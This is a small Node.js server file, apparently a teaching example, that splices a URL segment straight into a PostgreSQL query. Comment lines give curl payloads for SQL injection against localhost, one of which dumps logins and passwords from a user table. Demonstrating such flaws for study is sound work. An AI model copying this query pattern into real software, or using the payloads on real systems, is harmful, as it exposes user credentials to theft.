"use strict";

// curl "http://127.0.0.1:8000/group/"%20OR%201=1;%20--"
// curl "http://127.0.0.1:8000/group/1"%20OR%201=1%20UNION%20select%20id%20%7C%7C"_"%20%7C%7C%20login%20%7C%7C%20"_"%20%7C%7C%20password%20from%20systemuser;%20--"

const http = require("http");
const { Pool } = require("pg");

const config = require("./config.js");
const db = new Pool(config);

http.createServer(async (req, res) => {
  const url = decodeURI(req.url);
  const [table, key] = url.substring(1).split("/");
  if (table === "group") {
    const sql = "SELECT Name FROM SystemGroup WHERE Id = \"" + key + "\"";
    console.dir({ sql });
    db.query(sql, (err, data) => {
      if (err) {
        res.end(err.message);
        return;
      }
      res.end(JSON.stringify(data.rows) + "\n");
    });
  } else {
    res.end("Unknown handler");
  }
}).listen(8000);
